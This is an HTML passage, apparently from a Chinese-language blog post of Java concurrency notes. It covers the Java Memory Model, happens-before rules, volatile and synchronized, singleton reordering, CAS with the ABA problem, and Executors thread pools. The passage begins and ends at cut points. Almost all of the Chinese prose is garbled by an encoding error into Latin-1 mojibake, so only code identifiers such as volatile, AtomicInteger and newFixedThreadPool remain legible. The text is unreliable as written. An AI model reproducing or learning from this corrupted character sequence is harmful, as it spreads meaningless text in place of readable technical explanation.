id="javaå†…å­˜æ¨¡å‹jmm">Javaå†…å­˜æ¨¡å‹JMM</span></h3><p>JMMæè¿°çš„æ˜¯ä¸€ç»„è§„åˆ™ï¼Œå›´ç»•åŸå­æ€§ï¼Œæœ‰åºæ€§ã€å¯è§æ€§å±•å¼€ï¼Œå®šä¹‰äº†ç¨‹åºä¸­<font color="red">å„ä¸ªå˜é‡çš„è®¿é—®æ–¹å¼</font> </p><p>JMMå¤„äºä¸­é—´å±‚ï¼ŒåŒ…å«äº†ä¸¤ä¸ªæ–¹é¢ï¼šï¼ˆ1ï¼‰å†…å­˜æ¨¡å‹ï¼›ï¼ˆ2ï¼‰é‡æ’åºä»¥åŠhappens-beforeè§„åˆ™ã€‚åŒæ—¶ï¼Œä¸ºäº†ç¦æ­¢ç‰¹å®šç±»å‹çš„é‡æ’åºä¼šå¯¹ç¼–è¯‘å™¨å’Œå¤„ç†å™¨æŒ‡ä»¤åºåˆ—åŠ ä»¥æ§åˆ¶ã€‚</p><p><img src="/2020/04/06/mt/image-20200406102842448.png"></p><h3><span id="jmmä¸­çš„ä¸»å†…å­˜">JMMä¸­çš„ä¸»å†…å­˜</span></h3><p>Ã˜ å­˜å‚¨Javaå®ä¾‹å¯¹è±¡</p><p>Ã˜ åŒ…æ‹¬æˆå‘˜å˜é‡ã€ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰</p><p>Ã˜ å±äºæ•°æ®å…±äº«çš„åŒºåŸŸï¼Œå¤šçº¿ç¨‹å¹¶å‘æ“ä½œæ—¶ä¼šå¼•å‘çº¿ç¨‹å®‰å…¨é—®é¢˜</p><h3><span id="jmmä¸­çš„å·¥ä½œå†…å­˜">JMMä¸­çš„å·¥ä½œå†…å­˜</span></h3><p>Ã˜ å­˜å‚¨å½“å‰æ–¹æ³•çš„æ‰€æœ‰æœ¬åœ°å˜é‡ä¿¡æ¯ï¼Œæœ¬åœ°å˜é‡å¯¹å…¶ä»–çº¿ç¨‹ä¸å¯è§</p><p>Ã˜ å­—èŠ‚ç è¡Œå·æŒ‡ç¤ºå™¨ã€Nativeæ–¹æ³•ä¿¡æ¯</p><p>Ã˜ å±äºçº¿ç¨‹ç§æœ‰æ•°æ®åŒºåŸŸï¼Œä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜</p><h3><span id="jmmä¸javaå†…å­˜åŒºåŸŸåˆ’åˆ†æ˜¯ä¸åŒçš„æ¦‚å¿µå±‚æ¬¡">JMMä¸Javaå†…å­˜åŒºåŸŸåˆ’åˆ†æ˜¯ä¸åŒçš„æ¦‚å¿µå±‚æ¬¡</span></h3><p>Ã˜ JMMæè¿°çš„æ˜¯ä¸€ç»„è§„åˆ™ï¼Œå›´ç»•åŸå­æ€§ï¼Œæœ‰åºæ€§ã€å¯è§æ€§å±•å¼€</p><p>Ã˜ ç›¸ä¼¼ç‚¹ï¼šå­˜åœ¨å…±äº«åŒºåŸŸå’Œç§æœ‰åŒºåŸŸ</p><h3><span id="ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜çš„æ•°æ®å­˜å‚¨ç±»å‹ä»¥åŠæ“ä½œæ–¹å¼å½’çº³">ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜çš„æ•°æ®å­˜å‚¨ç±»å‹ä»¥åŠæ“ä½œæ–¹å¼å½’çº³</span></h3><p>Ã˜ æ–¹æ³•é‡Œçš„åŸºæœ¬æ•°æ®ç±»å‹æœ¬åœ°å˜é‡å°†ç›´æ¥å­˜å‚¨åœ¨å·¥ä½œå†…å­˜çš„æ ˆå¸§ç»“æ„ä¸­</p><p>Ã˜ å¼•ç”¨ç±»å‹çš„æœ¬åœ°å˜é‡ï¼šå¼•ç”¨å‚¨å­˜åœ¨å·¥ä½œå†…å­˜ä¸­ï¼Œå®ä¾‹å‚¨å­˜åœ¨ä¸»å†…å­˜ä¸­</p><p>Ã˜ æˆå‘˜å˜é‡ã€staticå˜é‡ã€ç±»ä¿¡æ¯å‡ä¼šè¢«å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­</p><p>Ã˜ ä¸»å†…å­˜å…±äº«çš„æ–¹å¼æ˜¯çº¿ç¨‹å„æ‹·è´ä¸€ä»½æ•°æ®åˆ°å·¥ä½œå†…å­˜ï¼Œæ“ä½œå®Œæˆååˆ·æ–°å›ä¸»å†…å­˜</p><p><img src="/2020/04/06/mt/image-20200406103124125.png"></p><h3><span id="æŒ‡ä»¤é‡æ’åºéœ€è¦æ»¡è¶³çš„æ¡ä»¶">æŒ‡ä»¤é‡æ’åºéœ€è¦æ»¡è¶³çš„æ¡ä»¶</span></h3><p>Ã˜ åœ¨å•çº¿ç¨‹ç¯å¢ƒä¸‹ä¸èƒ½æ”¹å˜ç¨‹åºè¿è¡Œçš„ç»“æœ</p><p>Ã˜ å­˜åœ¨æ•°æ®ä¾èµ–å…³ç³»çš„ä¸å…è®¸é‡æ’åˆ—</p><p><strong>æ— æ³•é€šè¿‡happens-beforeåŸåˆ™æ¨å¯¼å‡ºæ¥çš„ï¼Œæ‰èƒ½è¿›è¡ŒæŒ‡ä»¤çš„é‡æ’åº</strong></p><h4><span id="aæ“ä½œçš„ç»“æœéœ€è¦å¯¹bæ“ä½œå¯è§åˆ™aä¸bå­˜åœ¨happens-beforeå…³ç³»">Aæ“ä½œçš„ç»“æœéœ€è¦å¯¹Bæ“ä½œå¯è§ï¼Œåˆ™Aä¸Bå­˜åœ¨happens-beforeå…³ç³»</span></h4><p><img src="/2020/04/06/mt/image-20200406103135759.png"></p><h4><span id="happens-beforeçš„å…«å¤§åŸåˆ™">Happens-beforeçš„å…«å¤§åŸåˆ™</span></h4><ol><li><strong>ç¨‹åºæ¬¡åºè§„åˆ™</strong>ï¼šä¸€ä¸ªçº¿ç¨‹å†…ï¼ŒæŒ‰ç…§ä»£ç é¡ºåºï¼Œä¹¦å†™åœ¨å‰é¢çš„æ“ä½œå…ˆè¡Œå‘ç”Ÿäºä¹¦å†™åœ¨åé¢çš„æ“ä½œï¼›</li><li><strong>é”å®šè§„åˆ™</strong>ï¼šä¸€ä¸ªunLockæ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹åŒä¸€ä¸ªé”çš„lockæ“ä½œï¼›</li><li><strong>Volatileå˜é‡è§„åˆ™</strong>ï¼šå¯¹ä¸€ä¸ªå˜é‡çš„å†™æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹è¿™ä¸ªå˜é‡çš„è¯»æ“ä½œï¼›</li><li><strong>ä¼ é€’è§„åˆ™</strong>ï¼šå¦‚æœæ“ä½œAå‘ç”Ÿå…ˆè¡Œäºæ“ä½œBï¼Œè€Œæ“ä½œBåˆå…ˆè¡Œå‘ç”Ÿäºæ“ä½œCï¼Œåˆ™å¯ä»¥å¾—å‡ºæ“ä½œAå…ˆè¡Œå‘ç”Ÿäºæ“ä½œC</li><li><strong>çº¿ç¨‹å¯åŠ¨è§„åˆ™</strong>ï¼šThreadå¯¹è±¡çš„startï¼ˆï¼‰æ–¹æ³•å…ˆè¡Œå‘ç”Ÿäºæ­¤çº¿ç¨‹çš„æ¯ä¸€ä¸ªåŠ¨ä½œï¼›</li><li><strong>çº¿ç¨‹ä¸­æ–­è§„åˆ™</strong>ï¼šå¯¹çº¿ç¨‹interruptï¼ˆï¼‰æ–¹æ³•çš„è°ƒç”¨å…ˆè¡Œäºè¢«ä¸­æ–­çº¿ç¨‹çš„ä»£ç æ£€æµ‹åˆ°ä¸­æ–­äº‹ä»¶çš„å‘ç”Ÿ</li><li><strong>çº¿ç¨‹ç»ˆç»“è§„åˆ™</strong>ï¼šçº¿ç¨‹ä¸­æ‰€æœ‰æ“ä½œéƒ½å…ˆè¡Œäºçº¿ç¨‹çš„ç»ˆæ­¢æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Thread.joinï¼ˆï¼‰ æ–¹æ³•ç»“æŸï¼ŒThread.isAlive()çš„è¿”å›å€¼æ‰‹æ®µæ£€æµ‹çº¿ç¨‹å·²ç»ç»ˆæ­¢æ‰§è¡Œï¼›</li><li><strong>å¯¹è±¡ç»ˆç»“è§„åˆ™</strong>ï¼šä¸€ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–å®Œæˆå…ˆè¡Œå‘ç”Ÿäºä»–çš„finalizeï¼ˆï¼‰æ–¹æ³•çš„å¼€å§‹ï¼›</li></ol><h4><span id="happens-beforeçš„æ¦‚å¿µ">Happens-beforeçš„æ¦‚å¿µ</span></h4><p>å¦‚æœä¸¤ä¸ªæ“ä½œä¸æ»¡è¶³ä¸Šè¿°ä»»æ„ä¸€ä¸ªhappens-beforeè§„åˆ™ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ“ä½œå°±æ²¡æœ‰é¡ºåºçš„ä¿éšœï¼ŒJVMå¯ä»¥å¯¹è¿™ä¸¤ä¸ªæ“ä½œè¿›è¡Œé‡æ’åºï¼›</p><p>å¦‚æœæ“ä½œA happens-beforeæ“ä½œBï¼Œé‚£ä¹ˆæ“ä½œAåœ¨å†…å­˜ä¸Šæ‰€åšçš„æ“ä½œå¯¹æ“ä½œBéƒ½æ˜¯å¯è§çš„ã€‚ </p><p><img src="/2020/04/06/mt/image-20200406103324765.png"></p><p>æ— æ³•é€šè¿‡happens-beforeåŸåˆ™æ¨å¯¼å‡ºï¼ˆå› æ­¤ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼‰</p><p>å¯ä»¥å¯¹æ–¹æ³•åŠ å…¥synchronizedé”æˆ–è€…å¯¹å˜é‡è¿›è¡Œvolatileä¿®é¥°ã€‚ </p><h4><span id="finalé‡æ’åº">finalé‡æ’åº</span></h4><p>æŒ‰ç…§finalä¿®é¥°çš„æ•°æ®ç±»å‹åˆ†ç±»ï¼š</p><p>åŸºæœ¬æ•°æ®ç±»å‹:</p><ol><li>finalåŸŸå†™ï¼šç¦æ­¢<strong>final</strong>åŸŸå†™<strong>ä¸</strong>æ„é€ æ–¹æ³•é‡æ’åºï¼Œå³ç¦æ­¢finalåŸŸå†™é‡æ’åºåˆ°æ„é€ æ–¹æ³•ä¹‹å¤–ï¼Œä»è€Œä¿è¯è¯¥å¯¹è±¡å¯¹æ‰€æœ‰çº¿ç¨‹å¯è§æ—¶ï¼Œè¯¥å¯¹è±¡çš„finalåŸŸå…¨éƒ¨å·²ç»åˆå§‹åŒ–è¿‡ã€‚</li><li>finalåŸŸè¯»ï¼šç¦æ­¢åˆæ¬¡<strong>è¯»å¯¹è±¡çš„å¼•ç”¨</strong>ä¸<strong>è¯»è¯¥å¯¹è±¡åŒ…å«çš„</strong>finalåŸŸçš„é‡æ’åºã€‚</li></ol><p>å¼•ç”¨æ•°æ®ç±»å‹ï¼š</p><p>é¢å¤–å¢åŠ çº¦æŸï¼šç¦æ­¢åœ¨æ„é€ å‡½æ•°å¯¹<strong>ä¸€ä¸ª</strong>finalä¿®é¥°çš„å¯¹è±¡çš„æˆå‘˜åŸŸçš„å†™å…¥<strong>ä¸éšåå°†</strong>è¿™ä¸ªè¢«æ„é€ çš„å¯¹è±¡çš„å¼•ç”¨èµ‹å€¼ç»™å¼•ç”¨å˜é‡é‡æ’åº</p><h4><span id="volatilejvmæä¾›çš„è½»é‡çº§åŒæ­¥æœºåˆ¶">Volatileï¼šJVMæä¾›çš„è½»é‡çº§åŒæ­¥æœºåˆ¶</span></h4><p>Ã˜ ä¿è¯è¢«volatileä¿®é¥°çš„å…±äº«å˜é‡å¯¹æ‰€æœ‰çº¿ç¨‹æ€»æ˜¯å¯è§çš„</p><p>Ã˜ ç¦æ­¢æŒ‡ä»¤é‡æ’åºä¼˜åŒ–</p><h4><span id="volatileä¸ä¿è¯åŸå­æ€§">Volatileä¸ä¿è¯åŸå­æ€§</span></h4><p><img src="/2020/04/06/mt/image-20200406103421551.png"></p><p>ä¼šäº§ç”Ÿçº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå› ä¸º++ä¸æ˜¯åŸå­æ€§æ“ä½œ </p><p>å› æ­¤è¦ç”¨synchronizedä¿®é¥°ç¬¦ï¼Œå¹¶ä¸”volatileå¯ä»¥è¢«çœç•¥ã€‚</p><p><img src="/2020/04/06/mt/image-20200406103433641.png"></p><p>ç”±äºå¯¹booleanå€¼shutdownä¿®æ”¹æ˜¯åŸå­æ€§æ“ä½œï¼Œå› æ­¤å¯ä»¥ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚</p><p><img src="/2020/04/06/mt/image-20200406103441676.png"></p><h4><span id="volatileå˜é‡ä¸ºä½•ç«‹å³å¯è§">Volatileå˜é‡ä¸ºä½•ç«‹å³å¯è§ï¼Ÿ</span></h4><p>å½“å†™ä¸€ä¸ªvolatileå˜é‡æ—¶ï¼ŒJMMä¼šæŠŠè¯¥çº¿ç¨‹å¯¹åº”çš„å·¥ä½œå†…å­˜ä¸­çš„å…±äº«å˜é‡å€¼åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­ï¼›</p><p>å½“è¯»å–ä¸€ä¸ªvolatileå˜é‡æ—¶ï¼ŒJMMä¼šæŠŠè¯¥çº¿ç¨‹å¯¹åº”çš„å·¥ä½œå†…å­˜ç½®ä¸ºæ— æ•ˆã€‚</p><h4><span id="volatileå¦‚ä½•ç¦æ­¢é‡æ’ä¼˜åŒ–">Volatileå¦‚ä½•ç¦æ­¢é‡æ’ä¼˜åŒ–</span></h4><p>å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰</p><ol><li><p>ä¿è¯ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé¡ºåº</p></li><li><p>ä¿è¯æŸäº›å˜é‡çš„å†…å­˜å¯è§æ€§</p></li></ol><p>é€šè¿‡æ’å…¥å†…å­˜å±éšœæŒ‡ä»¤ç¦æ­¢åœ¨å†…å­˜å±éšœå‰åçš„æŒ‡ä»¤æ‰§è¡Œé‡æ’åºä¼˜åŒ–</p><p>å¼ºåˆ¶åˆ·å‡ºå„ç§CPUçš„ç¼“å­˜æ•°æ®ï¼Œå› æ­¤ä»»ä½•CPUä¸Šçš„çº¿ç¨‹éƒ½èƒ½è¯»å–åˆ°è¿™äº›æ•°æ®çš„æœ€æ–°ç‰ˆæœ¬ </p><h4><span id="å®ç°çº¿ç¨‹å®‰å…¨çš„å•ä¾‹å†™æ³•é”™è¯¯ç¤ºèŒƒ">å®ç°çº¿ç¨‹å®‰å…¨çš„å•ä¾‹å†™æ³•ï¼ˆé”™è¯¯ç¤ºèŒƒï¼‰</span></h4><p><img src="/2020/04/06/mt/image-20200406103504191.png"></p><p>å› ä¸ºæ­¥éª¤2å’Œæ­¥éª¤3ä¸å­˜åœ¨æ•°æ®ä¾èµ–å…³ç³»ï¼Œæ‰€ä»¥å¯èƒ½è¢«é‡æ’åºã€‚</p><p>é‡æ’åºåªä¼šä¿è¯å•çº¿ç¨‹çš„è¯­ä¹‰ä¸€è‡´æ€§ï¼ˆä¸²è¡Œè¯­ä¹‰çš„ä¸€è‡´æ€§ï¼‰ï¼Œä¸ä¼šä¿è¯å¤šçº¿ç¨‹ä¹‹é—´çš„è¯­ä¹‰ä¸€è‡´æ€§ã€‚</p><p>å› æ­¤æœ¬ä¾‹å¯èƒ½ä¼šå‡ºç°çº¿ç¨‹1é‡æ’åºåæ‰§è¡Œåˆ°ç¬¬2æ­¥æ—¶å·²ç»å°†instanceæŒ‡å‘äº†åˆ†é…çš„å†…å­˜ï¼Œå¯¼è‡´çº¿ç¨‹2è¿”å›instanceã€‚</p><p><font color="orange"><strong>è§£å†³æ–¹æ³•ï¼šä½¿ç”¨volatileä¿®é¥°instanceå³å¯ã€‚</strong></font></p><p><img src="/2020/04/06/mt/image-20200406103549743.png"></p><h4><span id="volatileå’Œsynchronizedçš„åŒºåˆ«">Volatileå’Œsynchronizedçš„åŒºåˆ«</span></h4><ol><li><p>Volatileæœ¬è´¨æ˜¯åœ¨å‘Šè¯‰JVMå½“å‰å˜é‡åœ¨å¯„å­˜å™¨ï¼ˆå·¥ä½œå†…å­˜ï¼‰ä¸­çš„å€¼æ˜¯ä¸ç¡®å®šçš„ï¼Œéœ€è¦ä»ä¸»å­˜ä¸­è¯»å–ï¼›synchronizedåˆ™æ˜¯é”å®šå½“å‰å˜é‡ï¼Œåªæœ‰å½“å‰çº¿ç¨‹å¯ä»¥è®¿é—®è¯¥å˜é‡ï¼Œå…¶ä»–çº¿ç¨‹è¢«é˜»å¡ä½ç›´åˆ°è¯¥çº¿ç¨‹å®Œæˆå˜é‡æ“ä½œä¸ºæ­¢</p></li><li><p>Volatileä»…èƒ½ä½¿ç”¨åœ¨å˜é‡çº§åˆ«ï¼›synchronizedåˆ™å¯ä»¥ä½¿ç”¨åœ¨å˜é‡ã€æ–¹æ³•å’Œç±»çº§åˆ«</p></li><li><p>Volatileä»…èƒ½å®ç°å˜é‡çš„ä¿®æ”¹å¯è§æ€§ï¼Œä¸èƒ½ä¿è¯åŸå­æ€§ï¼›è€Œsynchronizedåˆ™å¯ä»¥ä¿è¯å˜é‡ä¿®æ”¹çš„å¯è§æ€§å’ŒåŸå­æ€§</p></li><li><p>Volatileä¸ä¼šé€ æˆçº¿ç¨‹çš„é˜»å¡ï¼›synchronizedå¯èƒ½ä¼šé€ æˆçº¿ç¨‹çš„é˜»å¡</p></li><li><p>Volatileæ ‡è®°çš„å˜é‡ä¸ä¼šè¢«ç¼–è¯‘å™¨ä¼˜åŒ–ï¼›synchronizedæ ‡è®°çš„å˜é‡å¯ä»¥è¢«ç¼–è¯‘å™¨ä¼˜åŒ–</p></li></ol><h2><span id="cascompare-and-swap">CASï¼ˆcompare and swapï¼‰</span></h2><h3><span id="ä¹è§‚é”å’Œæ‚²è§‚é”">ä¹è§‚é”å’Œæ‚²è§‚é”</span></h3><p>Synchronizedè¿™ç§ç‹¬å é”å±äºæ‚²è§‚é”ï¼Œæ‚²è§‚é”å§‹ç»ˆå‡å®šä¼šå‘ç”Ÿå¹¶å‘å†²çªï¼Œå› æ­¤ä¼šå±è”½ä¸€åˆ‡å¯èƒ½ä¼šè¿åæ•°æ®å®Œæ•´æ€§çš„æ“ä½œï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¹è§‚é”ï¼Œå®ƒå‡è®¾ä¸ä¼šå‘ç”Ÿå¹¶å‘å†²çªï¼Œå› æ­¤åªåœ¨æäº¤æ—¶æ£€æŸ¥æ˜¯å¦è¿åæ•°æ®å®Œæ•´æ€§ï¼Œå¦‚æœæäº¤å¤±è´¥åˆ™ä¼šé‡è¯• </p><h3><span id="ä¸€ç§é«˜æ•ˆå®ç°çº¿ç¨‹å®‰å…¨æ€§çš„æ–¹æ³•">ä¸€ç§é«˜æ•ˆå®ç°çº¿ç¨‹å®‰å…¨æ€§çš„æ–¹æ³•</span></h3><p>Ã˜ æ”¯æŒåŸå­æ›´æ–°æ“ä½œï¼Œé€‚ç”¨äºè®¡æ•°å™¨ï¼Œåºåˆ—å‘ç”Ÿå™¨ç­‰åœºæ™¯</p><p>Ã˜ å±äºä¹è§‚é”æœºåˆ¶ï¼Œå·ç§°lock-free</p><p>Ã˜ CASæ“ä½œå¤±è´¥æ—¶ç”±å¼€å‘è€…å†³å®šæ˜¯ç»§ç»­å°è¯•ï¼Œè¿˜æ˜¯æ‰§è¡Œåˆ«çš„æ“ä½œ</p><p>å†…å­˜ä½ç½®çš„å€¼å³ä¸ºä¸»å†…å­˜é‡Œé¢çš„å€¼ã€‚</p><h3><span id="casæ€æƒ³">CASæ€æƒ³</span></h3><p>åŒ…å«ä¸‰ä¸ªæ“ä½œæ•°â€”â€”å†…å­˜ä½ç½®ï¼ˆVï¼‰ã€é¢„æœŸåŸå€¼ï¼ˆAï¼‰å’Œæ–°å€¼ï¼ˆBï¼‰ </p><p>ä¸æ–­å¤±è´¥é‡è¯•ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ã€‚</p><p> <img src="/2020/04/06/mt/image-20200406103630627.png"></p><p><img src="/2020/04/06/mt/image-20200406103636135.png"></p><p>æˆ‘ä»¬å‘ç°value++è¢«æ‹†åˆ†æˆå¦‚ä¸‹çš„æŒ‡ä»¤</p><p>å¾—åˆ°å€¼ã€æ“ä½œåŠ ä¸€ã€å†™å›å€¼</p><p><img src="/2020/04/06/mt/image-20200406103647421.png"></p><p>å¯ä»¥ä½¿ç”¨synchronizedä¿®é¥°ç¬¦ä¿®é¥°è§£å†³åŸå­æ€§æ“ä½œé—®é¢˜ï¼Œä½†æ˜¯æ•ˆç‡ä¸é«˜ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨AtomicIntegeræ¥è§£å†³ã€‚</p><p><img src="/2020/04/06/mt/image-20200406103657100.png"></p><p><img src="/2020/04/06/mt/image-20200406103701526.png"></p><p><strong><font color="orange">æ¯æ¬¡ä»å†…å­˜ä¸­è¯»å–æ•°æ®ç„¶åå°†æ­¤æ•°æ®å’Œ+1åçš„ç»“æœè¿›è¡ŒCASæ“ä½œï¼Œå¦‚æœæˆåŠŸå°±è¿”å›ç»“æœï¼Œå¦åˆ™é‡è¯•ç›´åˆ°æˆåŠŸä¸ºæ­¢ã€‚</font></strong></p><p><font color="red">CASæœ‰3ä¸ªæ“ä½œæ•°ï¼Œå†…å­˜å€¼Vï¼Œæ—§çš„é¢„æœŸå€¼Aï¼Œè¦ä¿®æ”¹çš„æ–°å€¼Bã€‚å½“ä¸”ä»…å½“é¢„æœŸå€¼Aå’Œå†…å­˜å€¼Vç›¸åŒæ—¶ï¼Œå°†å†…å­˜å€¼Vä¿®æ”¹ä¸ºBï¼Œå¦åˆ™ä»€ä¹ˆéƒ½ä¸åšã€‚</font></p><p>CASçš„åŸå­æ€§å®é™…ä¸Šæ˜¯CPUå®ç°</p><h3><span id="caså¤šæ•°æƒ…å†µä¸‹å¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„">CASå¤šæ•°æƒ…å†µä¸‹å¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„</span></h3><p>Ã˜ J.U.Cçš„atomicåŒ…æä¾›äº†å¸¸ç”¨çš„åŸå­æ€§æ•°æ®ç±»å‹ä»¥åŠå¼•ç”¨ã€æ•°ç»„ç­‰ç›¸å…³åŸå­ç±»å‹å’Œæ›´æ–°æ“ä½œå·¥å…·ï¼Œæ˜¯å¾ˆå¤šçº¿ç¨‹å®‰å…¨ç¨‹åºçš„é¦–é€‰</p><p>Ã˜ Unsafeç±»è™½ç„¶æä¾›CASæœåŠ¡ï¼Œä½†å› èƒ½å¤Ÿæ“çºµä»»æ„å†…å­˜åœ°å€è¯»å†™è€Œæœ‰éšæ‚£</p><p>Ã˜ Java9ä»¥åï¼Œå¯ä»¥ä½¿ç”¨Variable Handle APIæ¥æ›¿ä»£Unsafe </p><h3><span id="ç¼ºç‚¹">ç¼ºç‚¹</span></h3><p>Ã˜ è‹¥å¾ªç¯æ—¶é—´é•¿ï¼Œåˆ™å¼€é”€å¾ˆå¤§</p><p>Ã˜ åªèƒ½ä¿è¯ä¸€ä¸ªå…±äº«å˜é‡çš„åŸå­æ“ä½œ</p><p>Ã˜ ABAé—®é¢˜  è§£å†³ï¼šAtomicStampedReference</p><p>ABAçš„æ„æ€æ˜¯ï¼ŒAçš„å€¼è¢«æ”¹æˆBåˆè¢«æ”¹æˆAäº†ç„¶åcasæ²¡åŠæ³•æ„ŸçŸ¥å®ƒçš„å˜åŒ–ï¼Œä»¥ä¸ºå®ƒä¸€ç›´æ˜¯Aã€‚</p><h2><span id="javaçº¿ç¨‹æ± ">Javaçº¿ç¨‹æ± </span></h2><h3><span id="åˆ©ç”¨executorsåˆ›å»ºä¸åŒçš„çº¿ç¨‹æ± æ»¡è¶³ä¸åŒåœºæ™¯çš„éœ€æ±‚">åˆ©ç”¨Executorsåˆ›å»ºä¸åŒçš„çº¿ç¨‹æ± æ»¡è¶³ä¸åŒåœºæ™¯çš„éœ€æ±‚</span></h3><ol><li><p>newFixedThreadPoolï¼ˆint nThreadsï¼‰æŒ‡å®šå·¥ä½œçº¿ç¨‹æ•°é‡çš„çº¿ç¨‹æ± </p></li><li><p>newCachedThreadPool() å¤„ç†å¤§é‡çŸ­æ—¶é—´å·¥ä½œä»»åŠ¡çš„çº¿ç¨‹æ± ï¼Œ</p></li></ol><p>ï¼ˆ1ï¼‰   è¯•å›¾ç¼“å­˜çº¿ç¨‹å¹¶é‡ç”¨ï¼Œå½“æ— ç¼“å­˜çº¿ç¨‹å¯ç”¨æ—¶ï¼Œå°±ä¼šåˆ›å»ºæ–°çš„å·¥ä½œçº¿ç¨‹ï¼›</p><p>ï¼ˆ2ï¼‰   å¦‚æœçº¿ç¨‹é—²ç½®çš„æ—¶é—´è¶…è¿‡é˜ˆå€¼ï¼Œåˆ™ä¼šè¢«ç»ˆæ­¢å¹¶ç§»é™¤ç¼“å­˜ï¼›</p><p>ï¼ˆ3ï¼‰   ç³»ç»Ÿé•¿æ—¶é—´é—²ç½®çš„æ—¶å€™ï¼Œä¸ä¼šæ¶ˆè€—ä»€ä¹ˆèµ„æº</p><ol start="3"><li><p>newSingleThreadExcutorï¼ˆï¼‰åˆ›å»ºå”¯ä¸€çš„å·¥ä½œè€…çº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ï¼Œå¦‚æœçº¿ç¨‹å¼‚å¸¸ç»“æŸï¼Œä¼šæœ‰å¦ä¸€ä¸ªçº¿ç¨‹å–ä»£å®ƒ</p></li><li><p>newSingleThreadScheduledExecutorï¼ˆï¼‰ä¸newScheduledThreadPoolï¼ˆint corePoolSizeï¼‰å®šæ—¶æˆ–è€…å‘¨æœŸæ€§çš„å·¥ä½œè°ƒåº¦ï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºå•ä¸€å·¥ä½œçº¿ç¨‹è¿˜æ˜¯å¤šä¸ªçº¿ç¨‹</p></li><li><p>newWorkStealingPoolï¼ˆï¼‰</p><p>å†…éƒ¨ä¼šæ„å»ºForkJoinPoolï¼Œåˆ©ç”¨working-stealingç®—æ³•ï¼Œå¹¶è¡Œåœ°å¤„ç†ä»»åŠ¡ï¼Œä¸ä¿è¯å¤„ç†é¡ºåº</p></li></ol><h3><span id="forkx2fjoinæ¡†æ¶">Fork&#x2F;Joinæ¡†æ¶</span></h3><p>Work-Stealingç®—æ³•ï¼šæŸä¸ªçº¿ç¨‹ä»å…¶ä»–é˜Ÿåˆ—é‡Œçªƒå–ä»»åŠ¡æ¥æ‰§è¡Œ </p><p>Ã˜ æŠŠå¤§ä»»åŠ¡åˆ†å‰²æˆè‹¥å¹²ä¸ªå°ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œï¼Œæœ€ç»ˆæ±‡æ€»æ¯ä¸ªå°ä»»åŠ¡ç»“æœåå¾—åˆ°å¤§ä»»åŠ¡ç»“æœçš„æ¡†æ¶</p><p><img src="/2020/04/06/mt/image-20200406103916611.png"></p><p>å¯èƒ½ä¼šå‡ºç°æœ‰äº›çº¿ç¨‹çš„ä»»åŠ¡é˜Ÿåˆ—å·²ç»å®Œæˆäº†ï¼Œä½†å…¶å®ƒçº¿ç¨‹çš„é˜Ÿåˆ—è¿˜æœ‰ä»»åŠ¡æ²¡æœ‰å®Œæˆï¼Œä¸»è¦ä¼šé€ æˆå·²å®Œæˆä»»åŠ¡çš„çº¿ç¨‹ä¼šè¢«é—²ç½®ï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œå·²ç»å®Œæˆä»»åŠ¡çš„çº¿ç¨‹ä¼šä»æœªå®Œæˆä»»åŠ¡çº¿ç¨‹çš„é˜Ÿåˆ—é‡Œé¢çªƒå–ä»»åŠ¡ã€‚ä¸ºäº†å‡å°‘ä»»åŠ¡çªƒå–çº¿ç¨‹å’Œè¢«çªƒå–çº¿ç¨‹ä¹‹é—´çš„ç«äº‰é€šå¸¸ä¼šä½¿ç”¨åŒç«¯é˜Ÿåˆ—ã€‚è¢«çªƒå–ä»»åŠ¡çº¿ç¨‹æ°¸è¿œä»åŒç«¯é˜Ÿåˆ—çš„å¤´éƒ¨æ‹¿ä»»åŠ¡æ‰§è¡Œï¼Œè€Œçªƒå–ä»»åŠ¡çº¿ç¨‹æ°¸è¿œä»åŒç«¯é˜Ÿåˆ—çš„å°¾éƒ¨æ‹¿ä»»åŠ¡æ‰§è¡Œã€‚</p><h3><span id="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨çº¿ç¨‹æ± ">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨çº¿ç¨‹æ± </span></h3><p>Ã˜ é™ä½èµ„æºæ¶ˆè€—</p><p>Ã˜ æé«˜çº¿ç¨‹çš„å¯ç®¡ç†æ€§ </p><h3><span id="executorçš„æ¡†æ¶">Executorçš„æ¡†æ¶</span></h3><p><img src="/2020/04/06/mt/image-20200406103937736.png"></p><h3><span id="jucçš„ä¸‰ä¸ªexecutoræ¥å£">J.U.Cçš„ä¸‰ä¸ªExecutoræ¥å£</span></h3><p>Ã˜ Executorï¼šè¿è¡Œæ–°ä»»åŠ¡çš„ç®€å•æ¥å£ï¼Œå°†ä»»åŠ¡æäº¤å’Œä»»åŠ¡æ“ä½œç»†èŠ‚è§£è€¦</p><p><img src="/2020/04/06/mt/image-20200406103950097.png"></p><p>Ã˜ ExecutorServiceï¼šå…·å¤‡ç®¡ç†æ‰§è¡Œå™¨å’Œä»»åŠ¡ç”Ÿå‘½å‘¨æœŸçš„æ–¹æ³•ï¼Œæäº¤ä»»åŠ¡æœºåˆ¶æ›´å®Œå–„</p><p>Ã˜ 